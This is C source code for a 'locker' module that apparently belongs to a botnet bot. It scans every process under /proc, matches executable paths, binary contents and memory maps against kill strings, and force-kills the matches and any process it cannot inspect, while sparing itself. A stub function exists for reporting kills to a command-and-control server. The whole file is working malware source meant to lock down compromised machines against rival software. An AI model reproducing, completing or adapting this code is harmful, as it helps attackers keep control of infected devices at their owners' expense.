#ifdef DEBUG
#include <stdio.h>
#else
#include <stddef.h>
#endif
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>

#include "headers/locker.h"

//
// GENERAL VARIABLES
//
static struct locker_pid_data_t **pids = {NULL};
static struct locker_find_data_t **kill_path_strs = {NULL};
static uint16_t kill_path_strs_len = 0;
static struct locker_find_data_t **kill_exe_strs = {NULL};
static uint16_t kill_exe_strs_len = 0;
static uint8_t pids_len = 0;
static uint8_t locker_enabled = 0;
static uint8_t locker_state = LKR_STATE_START;
static uint8_t *program_path = NULL;
static uint16_t program_path_len = 0;
static uint8_t *program_maps_data = NULL;
static uint16_t program_maps_data_len = 0;
static DIR *dir = NULL;
//
// EOL
//



//
// STATIC/PRIVATE FUNCTION DECLARATIONS
//

//utils
static int lkr_len(char *buffer);
static void lkr_zero(void *buffer, int buffer_size);
static int lkr_cpy(void *str, void *str2, uint16_t size);
static int lkr_exists(uint8_t *str, uint8_t *str2, uint16_t str_size, uint16_t str2_len);

//cnc
static void report_c2();

//run check tasks
static uint8_t exe_path_match(struct locker_pid_data_t *pid_data);
static uint8_t exe_match(struct locker_pid_data_t *pid_data);
static uint8_t maps_match(struct locker_pid_data_t *pid_data);

//main function for running tasks
static void zero_pid_data(struct locker_pid_data_t *pid_data);
static void process_pid(struct locker_pid_data_t *pid_data);

//
// EOL
//



static int lkr_len(char *buffer)
{
    int buffer_pos = 0;
    while(buffer[buffer_pos] != 0)
    {
        buffer_pos++;
    }
    return buffer_pos;
}

static void lkr_zero(void *buffer, int buffer_size)
{
    uint8_t *buffer_b = buffer;
    int i;
    for(i = 0; i < buffer_size; i++)
    {
        buffer_b[i] = 0;
    }
    return;
}

static int lkr_cpy(void *str, void *str2, uint16_t size)
{
    int ret = 0;
    if(str != NULL && str2 != NULL)
    {
        uint8_t *str_b = str;
        uint8_t *str2_b = str2;
        int pos = 0;
        for(pos = 0; pos <= size; pos++)
        {
            str_b[pos] = str2_b[pos];
            ret = pos;
        }
        return ret;
    }
    return ret;
}

static int lkr_exists(uint8_t *str, uint8_t *str2, uint16_t str_size, uint16_t str2_len)
{
    int tmp_buffer_len = 0;
    int i;

    for(i = 0; i < str_size; i++)
    {
        if(str[i] == str2[tmp_buffer_len])
        {
            tmp_buffer_len++;
            if(tmp_buffer_len == str2_len)
            {
                return 1;
            }
        }
        else
        {
            tmp_buffer_len = 0;
        }
    }

    return 0;
}

//
// ADD KILL STRINGS
//
void locker_add_kill_path_string(uint8_t *buffer, uint16_t buffer_len)
{
    kill_path_strs = realloc(kill_path_strs, (kill_path_strs_len+1)*sizeof(struct locker_find_data *));
    kill_path_strs[kill_path_strs_len] = malloc(sizeof(struct locker_find_data_t));
    lkr_zero(kill_path_strs[kill_path_strs_len], sizeof(struct locker_find_data_t));
    kill_path_strs[kill_path_strs_len]->entry_len = buffer_len;
    lkr_cpy(kill_path_strs[kill_path_strs_len]->entry, buffer, buffer_len);
    kill_path_strs_len++;
}

void locker_clear_kill_path_string(void)
{
    if(kill_path_strs != NULL)
    {
        int x;
        for(x = 0; x < kill_path_strs_len; x++)
        {
            free(kill_path_strs[x]);
            kill_path_strs[x] = NULL;
        }
        free(kill_path_strs);
        kill_path_strs = NULL;
        kill_path_strs_len = 0;
    }
}

void locker_add_kill_exe_string(uint8_t *buffer, uint16_t buffer_len)
{
    kill_exe_strs = realloc(kill_exe_strs, (kill_exe_strs_len+1)*sizeof(struct locker_find_data *));
    kill_exe_strs[kill_exe_strs_len] = malloc(sizeof(struct locker_find_data_t));
    lkr_zero(kill_exe_strs[kill_exe_strs_len], sizeof(struct locker_find_data_t));
    kill_exe_strs[kill_exe_strs_len]->entry_len = buffer_len;
    lkr_cpy(kill_exe_strs[kill_exe_strs_len]->entry, buffer, buffer_len);
    kill_exe_strs_len++;
}

void locker_clear_kill_exe_string(void)
{
    if(kill_exe_strs != NULL)
    {
        int x;
        for(x = 0; x < kill_exe_strs_len; x++)
        {
            free(kill_exe_strs[x]);
            kill_exe_strs[x] = NULL;
        }
        free(kill_exe_strs);
        kill_exe_strs = NULL;
        kill_exe_strs_len = 0;
    }
}
//
// EOL
//


//
// REPORT TO CNC
//
static void report_c2(struct locker_pid_data_t *pid_data)
{
    //TODO; make this
}
//
// EOL
//


//
// "/PROC/{}/" entry scans
//
static uint8_t exe_path_match(struct locker_pid_data_t *pid_data)// check location ("/tmp", "/root") and our own exec dir
{
    int k = 0;
    char *file_path = NULL;
    char rdbuf[LKR_PATH_MAX] = { 0 };

    if(pid_data == NULL) { return 0; }

    pid_data->status.found_str[0] = 0;
    pid_data->status.status = LKR_PID_STATUS_CLEAN;

    file_path = malloc(LKR_PATH_MAX);

    lkr_zero(file_path, LKR_PATH_MAX);
    lkr_zero(rdbuf, LKR_PATH_MAX);

    k = 0;
    k += lkr_cpy(file_path+k, pid_data->pid_path, lkr_len(pid_data->pid_path));
    k += lkr_cpy(file_path+k, "exe", 3);
    file_path[k] = 0;

    k = -1;
    if((k = readlink(file_path, rdbuf, sizeof(rdbuf))) > 0)
    {
        rdbuf[k] = 0;

        if(lkr_exists(rdbuf, program_path, sizeof(rdbuf), LKR_PATH_MAX) == 1)
        {// found our program path
            k = 0;
            k += lkr_cpy(pid_data->status.found_str+k, rdbuf, lkr_len(rdbuf));
            k += lkr_cpy(pid_data->status.found_str+k, ":", 1);
            k += lkr_cpy(pid_data->status.found_str+k, program_path, lkr_len(program_path));
            pid_data->status.status = LKR_PID_STATUS_PROT;
        }
        else
        {// check kill strings
            for(k = 0; k < kill_path_strs_len; k++)
            {
                if(lkr_exists(rdbuf, kill_path_strs[k]->entry, sizeof(rdbuf), kill_path_strs[k]->entry_len) == 1)
                {
                    int x = 0;
                    x += lkr_cpy(pid_data->status.found_str+x, rdbuf, lkr_len(rdbuf));
                    x += lkr_cpy(pid_data->status.found_str+x, ":", 1);
                    x += lkr_cpy(pid_data->status.found_str+x, kill_path_strs[k]->entry, kill_path_strs[k]->entry_len);
                    pid_data->status.status = LKR_PID_STATUS_KILL;
                    break;
                }
            }
        }
    }
    else
    {
        pid_data->status.found_str[0] = 'N';
        pid_data->status.found_str[1] = 'F';
        pid_data->status.status = LKR_PID_STATUS_KILL;
    }
    
    for(k = 0; k < LKR_PATH_MAX; k++)
    {
        file_path[k] = 0;
    }
    free(file_path);
    file_path = NULL;
    return 1;
}

static uint8_t exe_match(struct locker_pid_data_t *pid_data)// check for strings or binary hex (uint8_t)
{
    int k = 0;
    char *file_path = NULL;
    char rdbuf[LKR_PATH_MAX] = { 0 };

    if(pid_data == NULL) { return 0; }

    pid_data->status.found_str[0] = 0;
    pid_data->status.status = LKR_PID_STATUS_CLEAN;

    file_path = malloc(LKR_PATH_MAX);

    lkr_zero(file_path, LKR_PATH_MAX);
    lkr_zero(rdbuf, LKR_PATH_MAX);

    k = 0;
    k += lkr_cpy(file_path+k, pid_data->pid_path, lkr_len(pid_data->pid_path));
    k += lkr_cpy(file_path+k, "exe", 3);
    file_path[k] = 0;

    k = -1;
    if((k = readlink(file_path, rdbuf, sizeof(rdbuf))) > 0)
    {

        rdbuf[k] = 0;

        if(lkr_exists(rdbuf, program_path, sizeof(rdbuf), LKR_PATH_MAX) == 1)
        {// found our program path
            k = 0;
            k += lkr_cpy(pid_data->status.found_str+k, rdbuf, lkr_len(rdbuf));
            k += lkr_cpy(pid_data->status.found_str+k, ":", 1);
            k += lkr_cpy(pid_data->status.found_str+k, program_path, lkr_len(program_path));
            pid_data->status.status = LKR_PID_STATUS_PROT;
        }
        else
        {// open up exe and scan
            int fd = open(rdbuf, O_RDONLY);
            if(!fd)
            {
                #ifdef DEBUG
                printf("[LKR] EXE_DATA: failed to open exe and scan!\r\n");
                #endif
                pid_data->status.found_str[0] = 'N';
                pid_data->status.found_str[1] = 'F';
                pid_data->status.status = LKR_PID_STATUS_KILL;
            }
            else
            {
                uint8_t recv_buf[4096];
                int rc = 0;
                lkr_zero(recv_buf, 4096);
                while((rc = read(fd, recv_buf, 4096)) > 0)
                {
                    k = 0;
                    for(k = 0; k < kill_exe_strs_len; k++)
                    {
                        if(lkr_exists(recv_buf, kill_exe_strs[k]->entry, rc, kill_exe_strs[k]->entry_len) == 1)
                        {
                            lkr_cpy(pid_data->status.found_str, kill_exe_strs[k]->entry, kill_exe_strs[k]->entry_len);
                            pid_data->status.status = LKR_PID_STATUS_KILL;
                            break;
                        }
                    }
                }
                close(fd);
            }
        }
    }
    else
    {
        pid_data->status.found_str[0] = 'N';
        pid_data->status.found_str[1] = 'F';
        pid_data->status.status = LKR_PID_STATUS_KILL;
    }
    
    for(k = 0; k < LKR_PATH_MAX; k++)
    {
        file_path[k] = 0;
    }
    free(file_path);
    file_path = NULL;
    return 1;
}

static uint8_t maps_match(struct locker_pid_data_t *pid_data)// check location ^^ and look for our own
{
    int k = 0;
    char *file_path = NULL;
    char rdbuf[LKR_PATH_MAX] = { 0 };

    if(pid_data == NULL) { return 0; }

    pid_data->status.found_str[0] = 0;
    pid_data->status.status = LKR_PID_STATUS_CLEAN;

    file_path = malloc(LKR_PATH_MAX);

    lkr_zero(file_path, LKR_PATH_MAX);
    lkr_zero(rdbuf, LKR_PATH_MAX);

    k = 0;
    k += lkr_cpy(file_path+k, pid_data->pid_path, lkr_len(pid_data->pid_path));
    k += lkr_cpy(file_path+k, "maps", 4);
    file_path[k] = 0;

    k = -1;
    k = open(file_path, O_RDONLY);
    if(!k)
    {
        return 0;
    }

    read(k, rdbuf, LKR_PATH_MAX-1);
    close(k);

    if(program_maps_data != NULL && lkr_exists(rdbuf, program_maps_data, LKR_PATH_MAX, program_maps_data_len) == 1)
    {
        k = 0;
        k += lkr_cpy(pid_data->status.found_str+k, rdbuf, lkr_len(rdbuf));
        k += lkr_cpy(pid_data->status.found_str+k, ":", 1);
        k += lkr_cpy(pid_data->status.found_str+k, program_maps_data, lkr_len(program_maps_data));
        pid_data->status.status = LKR_PID_STATUS_PROT;   
    }
    else
    {
        for(k = 0; k < kill_path_strs_len; k++)
        {
            if(lkr_exists(rdbuf, kill_path_strs[k]->entry, sizeof(rdbuf), kill_path_strs[k]->entry_len) == 1)
            {
                int x = 0;
                x += lkr_cpy(pid_data->status.found_str+x, rdbuf, lkr_len(rdbuf));
                x += lkr_cpy(pid_data->status.found_str+x, ":", 1);
                x += lkr_cpy(pid_data->status.found_str+x, kill_path_strs[k]->entry, kill_path_strs[k]->entry_len);
                pid_data->status.status = LKR_PID_STATUS_KILL;
                break;
            }
        }
    }
    return 1;
}
//
// EOL
//



//
// PROCESS PID
//
static void zero_pid_data(struct locker_pid_data_t *pid_data)
{
    int j;

    for(j = 0; j < sizeof(pid_data->pid_path); j++)
    {
        pid_data->pid_path[j] = 0;
    }
    for(j = 0; j < sizeof(pid_data->status.found_str); j++)
    {
        pid_data->status.found_str[j] = 0;
    }
    pid_data->pid = -1;
    pid_data->status.status = 0;
    pid_data->state = LKR_PID_STATE_NO_PID;

    return;
}

#ifdef DEBUG
char *process_get_state_str(uint8_t state)
{
    switch(state)
    {
        case LKR_PID_STATE_EXE_PATH_MATCH:
            return "EXE_PATH\0";
        case LKR_PID_STATE_EXE_MATCH:
            return "EXE_DATA\0";
        case LKR_PID_STATE_MAPS_MATCH:
            return "MAPS\0";
        default:
            return "invalid state";
    }
}
#endif

static void process_pid_check_status(struct locker_pid_data_t *pid_data)
{
    if(pid_data->status.status == LKR_PID_STATUS_CLEAN)
    {
        if(pid_data->state == LKR_PID_STATE_KILL-1 || pid_data->state > LKR_PID_STATE_KILL)
        {
            #ifdef DEBUG
            printf("[LKR] SAFE PROCESS pid %d\r\n", pid_data->pid);
            #endif
            pid_data->state = LKR_PID_STATE_FINISHED;
        }
        else
        {
            pid_data->state++;
        }
    }
    else if(pid_data->status.status == LKR_PID_STATUS_KILL)
    {
        #ifdef DEBUG
        printf("[LKR] KILL STATE=%s match (%s) in pid %d\r\n", process_get_state_str(pid_data->state), pid_data->status.found_str, pid_data->pid);
        #endif
        pid_data->state = LKR_PID_STATE_KILL;
    }
    else if(pid_data->status.status == LKR_PID_STATUS_PROT)
    {
        #ifdef DEBUG
        printf("[LKR] PROT STATE=%s match (%s) in pid %d\r\n", process_get_state_str(pid_data->state), pid_data->status.found_str, pid_data->pid);
        #endif
        pid_data->state = LKR_PID_STATE_FINISHED;
    }
}

static void process_pid(struct locker_pid_data_t *pid_data)
{
    if(pid_data == NULL) return;
    switch(pid_data->state)
    {
        case LKR_PID_STATE_MAPS_MATCH:
            if(maps_match(pid_data) == 0)
            {
                #ifdef DEBUG
                printf("[LKR] ERROR ON MAPS match in pid %d\r\n", pid_data->pid);
                #endif
                pid_data->state = LKR_PID_STATE_FINISHED;
                break;
            }
            process_pid_check_status(pid_data);
            break;
        case LKR_PID_STATE_EXE_PATH_MATCH:
            if(exe_path_match(pid_data) == 0)
            {
                #ifdef DEBUG
                printf("[LKR] ERROR ON exe path match in pid %d\r\n", pid_data->pid);
                #endif
                pid_data->state = LKR_PID_STATE_FINISHED;
                break;
            }
            process_pid_check_status(pid_data);
            break;
        case LKR_PID_STATE_EXE_MATCH:
            if(exe_match(pid_data) == 0)
            {
                #ifdef DEBUG
                printf("[LKR] ERROR ON exe match in pid %d\r\n", pid_data->pid);
                #endif
                pid_data->state = LKR_PID_STATE_FINISHED;
                break;
            }
            process_pid_check_status(pid_data);
            break;
        case LKR_PID_STATE_KILL:
            kill(pid_data->pid, 9);
            report_c2(pid_data);
            pid_data->state = LKR_PID_STATE_FINISHED;
            break;
        case LKR_PID_STATE_FINISHED:
            zero_pid_data(pid_data);
            break;
        default:
            break;
    }
}
//
// EOL
//


//
// LOCKER MAIN FUNCTIONS
//

void locker_init()
{
    int j;
    char *file_path = malloc(LKR_PATH_MAX);

    lkr_zero(file_path, LKR_PATH_MAX);

    if(program_path != NULL)
    {
        lkr_zero(program_path, LKR_PATH_MAX);
        free(program_path); 
        program_path = NULL;
        program_path_len = 0;
    }

    lkr_cpy(file_path, "/proc/self/exe", 14);

    program_path = malloc(LKR_PATH_MAX);
    
    if((program_path_len = readlink(file_path, program_path, LKR_PATH_MAX)) != -1)
    {
        program_path[program_path_len] = 0;

        #ifdef DEBUG
        printf("Running out of exe (%s)\r\n", program_path);
        #endif
    }
    else
    {
        #ifdef DEBUG
        printf("[LOCKER] Failed to get self exe\r\n");
        #endif
        lkr_zero(program_path, LKR_PATH_MAX);
        free(program_path); 
        program_path = NULL;
        program_path_len = 0;
    }
    lkr_zero(file_path, LKR_PATH_MAX);

    program_maps_data = malloc(LKR_PATH_MAX);
    lkr_zero(program_maps_data, LKR_PATH_MAX);

    lkr_cpy(file_path, "/proc/self/maps", 15);
    
    j = open(file_path, O_RDONLY);
    if(!j)
    {
        lkr_zero(program_maps_data, LKR_PATH_MAX);
        free(program_maps_data);
        program_maps_data = NULL;
        program_maps_data_len = 0;
    }
    else
    {
        program_maps_data_len = read(j, program_maps_data, LKR_PATH_MAX-1);
        if(program_maps_data_len <= 0)
        {
            lkr_zero(program_maps_data, LKR_PATH_MAX);
            free(program_maps_data);
            program_maps_data = NULL;
            program_maps_data_len = 0;
        }
        #ifdef DEBUG
        printf("Running with maps_data (%s)\r\n", program_maps_data);
        #endif
    }

    lkr_zero(file_path, LKR_PATH_MAX);
    free(file_path);
    file_path = NULL;
    
    return;
}

uint8_t locker_isenabled()// are we supposed to be running locker tasks?
{
    return locker_enabled;
}

uint8_t locker_toggle()// start/stop function
{
    int j;
    if(locker_enabled == 0)
    {
        if(pids != NULL)
        {
            if(pids_len > 0)
            {
                for(j = 0; j < pids_len; j++)
                {
                    free(pids[j]);
                    pids[j] = NULL;
                }
            }
            free(pids);
            pids = NULL;
        }
        pids = malloc(LKR_MAX_PIDS * sizeof(struct locker_pid_data_t *));
        for(j = 0; j < LKR_MAX_PIDS; j++)
        {
            pids[j] = malloc(sizeof(struct locker_pid_data_t));
            zero_pid_data(pids[j]);
        }
        locker_enabled = 1;
    }
    else
    {
        if(pids != NULL)
        {
            if(pids_len > 0)
            {
                for(j = 0; j < pids_len; j++)
                {
                    free(pids[j]);
                    pids[j] = NULL;
                }
            }
            free(pids);
            pids = NULL;
        }
        locker_enabled = 0;
    }
    return locker_enabled;
}

void locker()//call me when locker_enabled to do async tasks
{
    if(locker_isenabled() == 0) return;
    register int x = 0, j = 0;
    
    switch(locker_state)
    {
        case LKR_STATE_START:
            if ((dir = opendir("/proc/")) == NULL)
            {
                #ifdef DEBUG
                printf("[LKR] ERROR on open /proc/!\n");
                #endif
                break;
            }
            locker_state = LKR_STATE_SCAN;
            break;
        case LKR_STATE_SCAN:
            for(j = 0; j < LKR_MAX_PIDS; j++)
            {
                if(pids[j]->state == LKR_PID_STATE_NO_PID)
                {
                    struct dirent *file = NULL;
                    if((file = readdir(dir)) != NULL)
                    {
                        // skip all folders that are not PIDs
                        if (*(file->d_name) < '0' || *(file->d_name) > '9')
                        {
                            continue;
                        }
                            
                        pids[j]->pid = atoi(file->d_name);
                        int path_len = 0;
                        path_len += lkr_cpy(pids[j]->pid_path+path_len, "/proc/", 6);
                        path_len += lkr_cpy(pids[j]->pid_path+path_len, file->d_name, lkr_len(file->d_name));
                        path_len += lkr_cpy(pids[j]->pid_path+path_len, "/", 1);
                        pids[j]->pid_path[path_len] = 0;
                        pids[j]->state++;

                        #ifdef DEBUG
                        printf("[LKR] Added PID=%d PID_PATH=\"%s\" to scan pids\r\n", pids[j]->pid, pids[j]->pid_path);
                        #endif
                        continue;
                    }
                    else
                    {
                        locker_state = LKR_STATE_FINISH;
                    }
                }
                else
                {
                    process_pid(pids[j]);
                }
            }
            break;
        case LKR_STATE_FINISH:
            x = 0;
            for(j = 0; j < LKR_MAX_PIDS; j++)
            {
                if(pids[j]->state != LKR_PID_STATE_NO_PID)
                {
                    if(pids[j]->state > LKR_PID_STATE_FINISHED)
                    {
                        pids[j]->state = LKR_PID_STATE_FINISHED;
                    }
                    process_pid(pids[j]);
                    x++;
                }
            }
            if(x < 1) 
            {
                locker_state = LKR_STATE_EXIT;
            }
            break;
        case LKR_STATE_EXIT:
            locker_state = LKR_STATE_START;
            locker_toggle();
            #ifdef DEBUG
            printf("[LKR] Finished scan! \r\n");
            #endif
            break;
    }
}
//
// EOL
//
